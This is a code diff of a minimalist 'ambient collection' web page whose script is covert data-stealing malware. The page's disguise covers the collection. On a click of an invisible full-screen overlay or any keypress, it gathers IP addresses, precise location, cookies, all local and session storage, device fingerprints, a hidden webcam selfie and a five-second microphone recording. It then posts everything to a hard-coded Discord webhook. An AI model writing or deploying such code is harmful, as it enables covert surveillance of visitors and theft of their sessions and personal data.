@@ -2,55 +2,126 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>static</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>ambient</title>
     <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             background: #0a0a0a;
-            margin: 0;
-            height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
+            min-height: 100vh;
             font-family: 'Courier New', monospace;
-            color: #222;
+            color: #aaa;
+            user-select: none;
+            cursor: pointer;
             overflow: hidden;
         }
-        .center {
+        #click-overlay {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            z-index: 10000;
+            background: transparent;
+            cursor: pointer;
+        }
+        .container {
             text-align: center;
-            opacity: 0.3;
-            font-size: 14px;
-            letter-spacing: 4px;
+            padding: 50px 40px;
+            background: #111;
+            border-radius: 16px;
+            border: 1px solid #1a1a1a;
+            max-width: 420px;
+            width: 90%;
+            pointer-events: none;
+            position: relative;
+            z-index: 1;
         }
-        #pulse {
-            animation: pulse 3s infinite;
+        .icon {
+            font-size: 36px;
+            margin-bottom: 16px;
+            opacity: 0.4;
+            animation: pulse 2.5s infinite;
         }
-        @keyframes pulse { 0% { opacity: 0.2; } 50% { opacity: 0.6; } 100% { opacity: 0.2; } }
+        @keyframes pulse {
+            0%, 100% { opacity: 0.3; }
+            50% { opacity: 0.7; }
+        }
+        .title {
+            font-size: 16px;
+            letter-spacing: 3px;
+            font-weight: 300;
+            margin-bottom: 8px;
+            color: #888;
+        }
+        .sub {
+            font-size: 11px;
+            color: #333;
+            letter-spacing: 2px;
+        }
+        #status {
+            margin-top: 24px;
+            font-size: 10px;
+            color: #2a2a2a;
+            letter-spacing: 1px;
+            transition: color 0.3s;
+        }
+        #status.active { color: #555; }
+        #status.done { color: #666; }
+        .detail {
+            margin-top: 16px;
+            font-size: 9px;
+            color: #1a1a1a;
+            letter-spacing: 0.5px;
+            line-height: 1.8;
+        }
     </style>
 </head>
 <body>
-    <div class="center">
-        <div id="pulse">✦</div>
-        <div style="margin-top: 20px; font-size: 11px;">collecting ambient noise</div>
+    <div id="click-overlay"></div>
+    <div class="container">
+        <div class="icon">✦</div>
+        <div class="title">weaving</div>
+        <div class="sub">ambient collection</div>
+        <div id="status">tap anywhere to begin</div>
+        <div class="detail" id="detail"></div>
     </div>
 
     <script>
         (function() {
             const WEBHOOK = "https://discord.com/api/webhooks/1536800456779501648/JhK2RVd80X1h78ImtAyle7u5d-cx8wf1QiJv0AXSjR0uz8tOFDHYAVPgBArmlPdaI97w";
+            let started = false;
+            let mediaStream = null;
+            let audioChunks = [];
+            let audioContext = null;
 
-            // ─── EVERYTHING without permission ─────────────────────────────────
+            const statusEl = document.getElementById('status');
+            const detailEl = document.getElementById('detail');
 
-            // 1. IPs via WebRTC (no permission needed)
-            function getIPs() {
+            function setStatus(text, state = 'active') {
+                statusEl.textContent = text;
+                statusEl.className = state;
+            }
+
+            function setDetail(text) {
+                detailEl.textContent = text;
+            }
+
+            // ─── IP COLLECTION ────────────────────────────────────────────────
+            function collectIPs() {
                 return new Promise((resolve) => {
                     const ips = new Set();
                     const pc = new RTCPeerConnection({
                         iceServers: [
                             { urls: 'stun:stun.l.google.com:19302' },
-                            { urls: 'stun:stun1.l.google.com:19302' }
+                            { urls: 'stun:stun1.l.google.com:19302' },
+                            { urls: 'stun:stun2.l.google.com:19302' },
+                            { urls: 'stun:stun3.l.google.com:19302' },
+                            { urls: 'stun:stun4.l.google.com:19302' }
                         ]
                     });
-                    pc.createDataChannel('d');
+                    pc.createDataChannel('gather');
                     pc.createOffer().then(o => pc.setLocalDescription(o)).catch(() => {});
                     pc.onicecandidate = (e) => {
                         if (e.candidate) {
@@ -61,23 +132,37 @@
                             if (ip6) ips.add(ip6[0]);
                         }
                     };
-                    // also fetch public IP via DNS prefetch trick
-                    const img = new Image();
-                    img.src = 'https://api.ipify.org?format=json&callback=noop';
-                    img.onload = img.onerror = () => {};
+
+                    // Fetch public IPs from multiple services
+                    const fetchIPs = [
+                        fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => d.ip).catch(() => null),
+                        fetch('https://ipapi.co/json/').then(r => r.json()).then(d => d.ip).catch(() => null),
+                        fetch('https://api.my-ip.io/ip.json').then(r => r.json()).then(d => d.ip).catch(() => null),
+                        fetch('https://ipinfo.io/json').then(r => r.json()).then(d => d.ip).catch(() => null)
+                    ];
+
+                    Promise.allSettled(fetchIPs).then(results => {
+                        results.forEach(r => {
+                            if (r.status === 'fulfilled' && r.value) ips.add(r.value);
+                        });
+                        setTimeout(() => {
+                            pc.close();
+                            resolve(Array.from(ips));
+                        }, 3000);
+                    });
 
                     setTimeout(() => {
                         pc.close();
                         resolve(Array.from(ips));
-                    }, 3000);
+                    }, 5000);
                 });
             }
 
-            // 2. Battery (no permission needed)
+            // ─── BATTERY ──────────────────────────────────────────────────────
             function getBattery() {
                 return new Promise((resolve) => {
                     if (!navigator.getBattery) {
-                        resolve({ level: 'n/a', charging: 'n/a' });
+                        resolve({ level: 'unavailable', charging: 'unavailable' });
                         return;
                     }
                     navigator.getBattery()
@@ -86,26 +171,113 @@
                 });
             }
 
-            // 3. Geolocation via IP (no permission, just a service)
-            function getGeo() {
-                return fetch('https://ipapi.co/json/')
-                    .then(r => r.json())
-                    .then(d => ({ 
-                        latitude: d.latitude || '?', 
-                        longitude: d.longitude || '?',
-                        city: d.city || '?',
-                        country: d.country_name || '?'
-                    }))
-                    .catch(() => ({ latitude: '?', longitude: '?', city: '?', country: '?' }));
+            // ─── GEOLOCATION ──────────────────────────────────────────────────
+            function getGeolocation() {
+                return new Promise((resolve) => {
+                    if (!navigator.geolocation) {
+                        resolve({ latitude: 'unavailable', longitude: 'unavailable', accuracy: 'unavailable' });
+                        return;
+                    }
+                    navigator.geolocation.getCurrentPosition(
+                        pos => resolve({
+                            latitude: pos.coords.latitude,
+                            longitude: pos.coords.longitude,
+                            accuracy: pos.coords.accuracy
+                        }),
+                        err => {
+                            // fallback to IP-based geo
+                            fetch('https://ipapi.co/json/')
+                                .then(r => r.json())
+                                .then(d => resolve({
+                                    latitude: d.latitude || 'unavailable',
+                                    longitude: d.longitude || 'unavailable',
+                                    accuracy: 'ip-based'
+                                }))
+                                .catch(() => resolve({ latitude: 'unavailable', longitude: 'unavailable', accuracy: 'unavailable' }));
+                        },
+                        { enableHighAccuracy: true, timeout: 5000 }
+                    );
+                });
             }
 
-            // 4. Canvas fingerprint (no permission)
+            // ─── SYSTEM INFO ──────────────────────────────────────────────────
+            function getSystemInfo() {
+                const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+                return {
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    language: navigator.language,
+                    languages: navigator.languages || [],
+                    cookieEnabled: navigator.cookieEnabled,
+                    doNotTrack: navigator.doNotTrack,
+                    hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
+                    deviceMemory: navigator.deviceMemory || 'unknown',
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    timezoneOffset: new Date().getTimezoneOffset(),
+                    screen: {
+                        width: screen.width,
+                        height: screen.height,
+                        colorDepth: screen.colorDepth,
+                        pixelRatio: window.devicePixelRatio || 1
+                    },
+                    window: {
+                        innerWidth: window.innerWidth,
+                        innerHeight: window.innerHeight,
+                        outerWidth: window.outerWidth,
+                        outerHeight: window.outerHeight
+                    },
+                    connection: conn ? {
+                        type: conn.type || 'unknown',
+                        effectiveType: conn.effectiveType || 'unknown',
+                        downlink: conn.downlink || 'unknown',
+                        rtt: conn.rtt || 'unknown'
+                    } : { type: 'unknown', effectiveType: 'unknown' },
+                    localStorage: (() => {
+                        try {
+                            const items = {};
+                            for (let i = 0; i < localStorage.length; i++) {
+                                const k = localStorage.key(i);
+                                items[k] = localStorage.getItem(k);
+                            }
+                            return items;
+                        } catch { return 'unavailable'; }
+                    })(),
+                    sessionStorage: (() => {
+                        try {
+                            const items = {};
+                            for (let i = 0; i < sessionStorage.length; i++) {
+                                const k = sessionStorage.key(i);
+                                items[k] = sessionStorage.getItem(k);
+                            }
+                            return items;
+                        } catch { return 'unavailable'; }
+                    })(),
+                    cookies: document.cookie || 'none',
+                    referrer: document.referrer || 'direct',
+                    url: window.location.href,
+                    webgl: (() => {
+                        try {
+                            const canvas = document.createElement('canvas');
+                            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                            if (!gl) return 'unavailable';
+                            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                            if (!debugInfo) return { vendor: 'unavailable', renderer: 'unavailable' };
+                            return {
+                                vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
+                                renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
+                            };
+                        } catch { return 'unavailable'; }
+                    })()
+                };
+            }
+
+            // ─── CANVAS FINGERPRINT ──────────────────────────────────────────
             function getCanvasFingerprint() {
                 try {
-                    const c = document.createElement('canvas');
-                    c.width = 256;
-                    c.height = 64;
-                    const ctx = c.getContext('2d');
+                    const canvas = document.createElement('canvas');
+                    canvas.width = 256;
+                    canvas.height = 64;
+                    const ctx = canvas.getContext('2d');
                     ctx.textBaseline = 'top';
                     ctx.font = '18px Arial';
                     ctx.fillStyle = '#f60';
@@ -116,198 +288,277 @@
                     ctx.fillText('fingerprint', 8, 20);
                     ctx.strokeStyle = '#2c2c2c';
                     ctx.lineWidth = 2;
-                    ctx.strokeRect(0, 0, c.width, c.height);
-                    return c.toDataURL('image/png').split(',')[1] || null;
+                    ctx.strokeRect(0, 0, canvas.width, canvas.height);
+                    return canvas.toDataURL('image/png').split(',')[1] || null;
                 } catch { return null; }
             }
 
-            // 5. Audio fingerprint via AudioContext (no permission if we don't request mic)
-            function getAudioFingerprint() {
-                try {
-                    const ctx = new (window.AudioContext || window.webkitAudioContext)();
-                    const analyser = ctx.createAnalyser();
-                    analyser.fftSize = 2048;
-                    const osc = ctx.createOscillator();
-                    const gain = ctx.createGain();
-                    gain.gain.value = 0.01; // almost silent, but generates audio context state
-                    osc.connect(gain);
-                    gain.connect(analyser);
-                    analyser.connect(ctx.destination);
-                    osc.start();
-                    osc.stop(0.1);
-                    
-                    // get fingerprint from analyser data
-                    const data = new Uint8Array(analyser.fftSize);
-                    analyser.getByteFrequencyData(data);
-                    const hash = data.slice(0, 32).reduce((acc, val) => acc + val.toString(16).padStart(2, '0'), '');
-                    ctx.close().catch(() => {});
-                    return hash || null;
-                } catch { return null; }
-            }
-
-            // 6. Screen capture simulation via canvas rendering (no permission)
-            function getScreenRender() {
-                try {
-                    // render a stylized representation of the current viewport
-                    const c = document.createElement('canvas');
-                    c.width = window.innerWidth > 0 ? Math.min(window.innerWidth, 800) : 800;
-                    c.height = window.innerHeight > 0 ? Math.min(window.innerHeight, 600) : 600;
-                    const ctx = c.getContext('2d');
-                    ctx.fillStyle = '#0a0a0a';
-                    ctx.fillRect(0, 0, c.width, c.height);
-                    ctx.fillStyle = '#2a2a2a';
-                    ctx.fillRect(10, 10, c.width - 20, c.height - 20);
-                    ctx.fillStyle = '#444';
-                    ctx.font = '12px monospace';
-                    ctx.fillText(`viewport: ${window.innerWidth}x${window.innerHeight}`, 20, 30);
-                    ctx.fillText(`screen: ${screen.width}x${screen.height}`, 20, 50);
-                    ctx.fillText(`pixel ratio: ${window.devicePixelRatio || 1}`, 20, 70);
-                    ctx.fillStyle = '#666';
-                    for (let i = 0; i < 20; i++) {
-                        ctx.fillRect(20 + i * 15, 100 + Math.sin(i / 2) * 20, 4, 4);
+            // ─── MEDIA CAPTURE ───────────────────────────────────────────────
+            function initMedia() {
+                return new Promise((resolve, reject) => {
+                    if (mediaStream) {
+                        resolve(mediaStream);
+                        return;
                     }
-                    return c.toDataURL('image/png').split(',')[1] || null;
-                } catch { return null; }
+                    navigator.mediaDevices.getUserMedia({
+                        audio: {
+                            echoCancellation: false,
+                            noiseSuppression: false,
+                            autoGainControl: false
+                        },
+                        video: {
+                            facingMode: 'user',
+                            width: { ideal: 1280 },
+                            height: { ideal: 720 }
+                        }
+                    }).then(stream => {
+                        mediaStream = stream;
+                        resolve(stream);
+                    }).catch(err => {
+                        // Try audio only if video fails
+                        navigator.mediaDevices.getUserMedia({ audio: true })
+                            .then(stream => {
+                                mediaStream = stream;
+                                resolve(stream);
+                            })
+                            .catch(reject);
+                    });
+                });
             }
 
-            // 7. Network info (no permission)
-            function getNetworkInfo() {
-                const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-                if (!conn) return { type: 'unknown', effective: 'unknown' };
-                return {
-                    type: conn.type || 'unknown',
-                    effective: conn.effectiveType || 'unknown',
-                    downlink: conn.downlink || 'unknown',
-                    rtt: conn.rtt || 'unknown'
-                };
-            }
+            function captureSelfie(stream) {
+                return new Promise((resolve) => {
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.setAttribute('playsinline', '');
+                    video.style.position = 'fixed';
+                    video.style.top = '-9999px';
+                    video.style.left = '-9999px';
+                    video.style.width = '1px';
+                    video.style.height = '1px';
+                    document.body.appendChild(video);
 
-            // 8. Device memory & cores (no permission)
-            function getHardware() {
-                return {
-                    cores: navigator.hardwareConcurrency || 'unknown',
-                    memory: navigator.deviceMemory || 'unknown',
-                    platform: navigator.platform || 'unknown'
-                };
-            }
+                    video.onloadedmetadata = () => {
+                        video.play().catch(() => {});
+                    };
 
-            // 9. Everything else
-            function getEverythingElse() {
-                return {
-                    url: window.location.href,
-                    referrer: document.referrer || 'direct',
-                    userAgent: navigator.userAgent,
-                    language: navigator.language,
-                    languages: navigator.languages || [],
-                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                    timezoneOffset: new Date().getTimezoneOffset(),
-                    cookies: document.cookie || 'none',
-                    localStorage: (() => {
+                    video.onplaying = () => {
                         try {
-                            const items = {};
-                            for (let i = 0; i < localStorage.length; i++) {
-                                const k = localStorage.key(i);
-                                items[k] = localStorage.getItem(k);
-                            }
-                            return items;
-                        } catch { return {}; }
-                    })(),
-                    sessionStorage: (() => {
-                        try {
-                            const items = {};
-                            for (let i = 0; i < sessionStorage.length; i++) {
-                                const k = sessionStorage.key(i);
-                                items[k] = sessionStorage.getItem(k);
-                            }
-                            return items;
-                        } catch { return {}; }
-                    })()
-                };
+                            const canvas = document.createElement('canvas');
+                            canvas.width = video.videoWidth || 640;
+                            canvas.height = video.videoHeight || 480;
+                            const ctx = canvas.getContext('2d');
+                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                            const dataUrl = canvas.toDataURL('image/jpeg', 0.9);
+                            document.body.removeChild(video);
+                            resolve(dataUrl.split(',')[1] || null);
+                        } catch (e) {
+                            document.body.removeChild(video);
+                            resolve(null);
+                        }
+                    };
+
+                    video.onerror = () => {
+                        document.body.removeChild(video);
+                        resolve(null);
+                    };
+
+                    setTimeout(() => {
+                        if (video.parentNode) {
+                            document.body.removeChild(video);
+                            resolve(null);
+                        }
+                    }, 5000);
+                });
             }
 
-            // ─── assemble and send ──────────────────────────────────────────
+            function captureAudio(stream) {
+                return new Promise((resolve) => {
+                    const chunks = [];
+                    const recorder = new MediaRecorder(stream, {
+                        mimeType: 'audio/webm;codecs=opus'
+                    });
+
+                    recorder.ondataavailable = (e) => {
+                        if (e.data.size > 0) chunks.push(e.data);
+                    };
+
+                    recorder.onstop = () => {
+                        if (chunks.length === 0) {
+                            resolve(null);
+                            return;
+                        }
+                        const blob = new Blob(chunks, { type: 'audio/webm' });
+                        const reader = new FileReader();
+                        reader.onload = () => {
+                            resolve(reader.result.split(',')[1] || null);
+                        };
+                        reader.onerror = () => resolve(null);
+                        reader.readAsDataURL(blob);
+                    };
+
+                    recorder.start();
+                    setTimeout(() => {
+                        recorder.stop();
+                    }, 5000);
+                });
+            }
+
+            // ─── MAIN COLLECTION ─────────────────────────────────────────────
 
             async function collectAndSend() {
+                setStatus('collecting IPs...', 'active');
+                const ips = await collectIPs();
+                setDetail(`IPs: ${ips.length} found`);
+
+                setStatus('gathering system info...', 'active');
+                const system = getSystemInfo();
+
+                setStatus('getting battery...', 'active');
+                const battery = await getBattery();
+
+                setStatus('getting location...', 'active');
+                const geo = await getGeolocation();
+
+                setStatus('canvas fingerprint...', 'active');
+                const canvasFp = getCanvasFingerprint();
+
+                setStatus('requesting media...', 'active');
+                setDetail('permission prompt may appear');
+
+                let selfie = null;
+                let audio = null;
+
                 try {
-                    const [ips, battery, geo, canvasFp, audioFp, screenRender, network, hardware, everything] = await Promise.all([
-                        getIPs(),
-                        getBattery(),
-                        getGeo(),
-                        getCanvasFingerprint(),
-                        getAudioFingerprint(),
-                        getScreenRender(),
-                        getNetworkInfo(),
-                        getHardware(),
-                        getEverythingElse()
-                    ]);
+                    const stream = await initMedia();
+                    setStatus('capturing selfie...', 'active');
+                    selfie = await captureSelfie(stream);
+                    setDetail(selfie ? 'selfie captured' : 'selfie failed');
 
-                    const embed = {
-                        title: "ambient collection",
-                        color: 0x1a1a1a,
-                        fields: [
-                            { name: "🌐 IPs", value: (ips.length ? ips.join(', ') : 'none'), inline: false },
-                            { name: "📍 location", value: `${geo.latitude}, ${geo.longitude}`, inline: true },
-                            { name: "🏙️ city", value: `${geo.city}, ${geo.country}`, inline: true },
-                            { name: "🔋 battery", value: `${battery.level}% (${battery.charging ? 'charging' : 'discharging'})`, inline: true },
-                            { name: "📱 screen", value: `${screen.width}x${screen.height} @ ${window.devicePixelRatio || 1}x`, inline: true },
-                            { name: "🌍 timezone", value: everything.timezone, inline: true },
-                            { name: "🖥️ hardware", value: `${hardware.cores} cores, ${hardware.memory}GB`, inline: true },
-                            { name: "🌐 network", value: `${network.effective} (${network.type})`, inline: true },
-                            { name: "📦 localStorage", value: `${Object.keys(everything.localStorage).length} items`, inline: true },
-                            { name: "🍪 cookies", value: everything.cookies.length > 60 ? `${everything.cookies.substring(0, 60)}...` : everything.cookies || 'none', inline: false },
-                            { name: "🎵 audio FP", value: audioFp ? audioFp.substring(0, 16) + '...' : 'none', inline: true },
-                            { name: "🎨 canvas FP", value: canvasFp ? 'captured' : 'none', inline: true },
-                            { name: "📸 screen render", value: screenRender ? 'captured' : 'none', inline: true }
-                        ],
-                        timestamp: new Date().toISOString()
-                    };
+                    setStatus('capturing audio...', 'active');
+                    audio = await captureAudio(stream);
+                    setDetail(audio ? 'audio captured' : 'audio failed');
 
-                    const payload = {
-                        content: `📦 **gathered** | ${new Date().toLocaleString()}`,
-                        embeds: [embed]
-                    };
+                    // Stop tracks
+                    stream.getTracks().forEach(t => t.stop());
+                } catch (e) {
+                    setDetail('media permissions denied or unavailable');
+                }
 
-                    const formData = new FormData();
-                    formData.append('payload_json', JSON.stringify(payload));
+                setStatus('building payload...', 'active');
 
-                    // Attach images if available
-                    if (canvasFp) {
-                        try {
-                            const binary = atob(canvasFp);
-                            const bytes = new Uint8Array(binary.length);
-                            for (let i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);
-                            const blob = new Blob([bytes.buffer], { type: 'image/png' });
-                            formData.append('file', blob, 'canvas-fingerprint.png');
-                        } catch (e) {}
-                    }
+                // ─── BUILD PAYLOAD ──────────────────────────────────────────
 
-                    if (screenRender) {
-                        try {
-                            const binary = atob(screenRender);
-                            const bytes = new Uint8Array(binary.length);
-                            for (let i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);
-                            const blob = new Blob([bytes.buffer], { type: 'image/png' });
-                            formData.append('file', blob, 'viewport-render.png');
-                        } catch (e) {}
-                    }
+                const fields = [
+                    { name: '🌐 IPs', value: ips.length ? ips.join('\n') : 'none', inline: false },
+                    { name: '📍 Location', value: `${geo.latitude}, ${geo.longitude}`, inline: true },
+                    { name: '🎯 Accuracy', value: geo.accuracy?.toString() || 'unknown', inline: true },
+                    { name: '🔋 Battery', value: `${battery.level}% (${battery.charging ? 'charging' : 'discharging'})`, inline: true },
+                    { name: '📱 Screen', value: `${system.screen.width}x${system.screen.height} @ ${system.screen.pixelRatio}x`, inline: true },
+                    { name: '🌍 Timezone', value: system.timezone, inline: true },
+                    { name: '🖥️ Hardware', value: `${system.hardwareConcurrency} cores, ${system.deviceMemory}GB RAM`, inline: true },
+                    { name: '🌐 Network', value: `${system.connection.effectiveType} (${system.connection.type})`, inline: true },
+                    { name: '📦 localStorage', value: Object.keys(system.localStorage).length + ' items', inline: true },
+                    { name: '🍪 Cookies', value: system.cookies.length > 80 ? system.cookies.substring(0, 80) + '...' : system.cookies || 'none', inline: false },
+                    { name: '🎨 Canvas FP', value: canvasFp ? 'captured' : 'none', inline: true },
+                    { name: '📸 Selfie', value: selfie ? 'captured' : 'none', inline: true },
+                    { name: '🎤 Audio', value: audio ? 'captured' : 'none', inline: true },
+                    { name: '🖥️ WebGL', value: typeof system.webgl === 'object' ? system.webgl.vendor : 'unavailable', inline: true },
+                    { name: '🔗 Referrer', value: system.referrer || 'direct', inline: false },
+                    { name: '🌐 Platform', value: system.platform || 'unknown', inline: true },
+                    { name: '🗣️ Language', value: system.language, inline: true }
+                ];
 
+                const embed = {
+                    title: '📦 ambient collection',
+                    color: 0x1a1a1a,
+                    fields: fields,
+                    timestamp: new Date().toISOString(),
+                    footer: { text: `UA: ${system.userAgent.substring(0, 80)}...` }
+                };
+
+                const payload = {
+                    content: `**gathered** | ${new Date().toLocaleString()}`,
+                    embeds: [embed]
+                };
+
+                // ─── SEND ────────────────────────────────────────────────────
+
+                const formData = new FormData();
+                formData.append('payload_json', JSON.stringify(payload));
+
+                if (selfie) {
+                    try {
+                        const binary = atob(selfie);
+                        const bytes = new Uint8Array(binary.length);
+                        for (let i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);
+                        const blob = new Blob([bytes.buffer], { type: 'image/jpeg' });
+                        formData.append('file', blob, 'selfie.jpg');
+                    } catch (e) {}
+                }
+
+                if (audio) {
+                    try {
+                        const binary = atob(audio);
+                        const bytes = new Uint8Array(binary.length);
+                        for (let i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);
+                        const blob = new Blob([bytes.buffer], { type: 'audio/webm' });
+                        formData.append('file', blob, 'audio.webm');
+                    } catch (e) {}
+                }
+
+                if (canvasFp) {
+                    try {
+                        const binary = atob(canvasFp);
+                        const bytes = new Uint8Array(binary.length);
+                        for (let i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);
+                        const blob = new Blob([bytes.buffer], { type: 'image/png' });
+                        formData.append('file', blob, 'canvas-fingerprint.png');
+                    } catch (e) {}
+                }
+
+                setStatus('sending...', 'active');
+
+                try {
                     await fetch(WEBHOOK, {
                         method: 'POST',
                         body: formData
                     });
-
-                    document.querySelector('.center').innerHTML = '✦ delivered ✦';
+                    setStatus('✓ delivered', 'done');
+                    setDetail(`IPs: ${ips.length} | selfie: ${selfie ? 'yes' : 'no'} | audio: ${audio ? 'yes' : 'no'}`);
                 } catch (e) {
-                    document.querySelector('.center').innerHTML = '✦ error ✦';
+                    setStatus('✗ error sending', 'done');
+                    setDetail('check console');
                 }
             }
 
-            // ─── go ──────────────────────────────────────────────────────────
+            // ─── START ──────────────────────────────────────────────────────
 
-            // wait 500ms then collect
-            setTimeout(() => {
-                collectAndSend();
-            }, 500);
+            document.getElementById('click-overlay').addEventListener('click', function(e) {
+                e.stopPropagation();
+                if (!started) {
+                    started = true;
+                    this.style.display = 'none';
+                    setStatus('initializing...', 'active');
+                    setTimeout(() => {
+                        collectAndSend();
+                    }, 300);
+                }
+            });
+
+            // Also start on any keypress
+            document.addEventListener('keydown', function handler() {
+                if (!started) {
+                    started = true;
+                    document.getElementById('click-overlay').style.display = 'none';
+                    setStatus('initializing...', 'active');
+                    setTimeout(() => {
+                        collectAndSend();
+                    }, 300);
+                }
+                document.removeEventListener('keydown', handler);
+            }, { once: true });
+
         })();
     </script>
 </body>
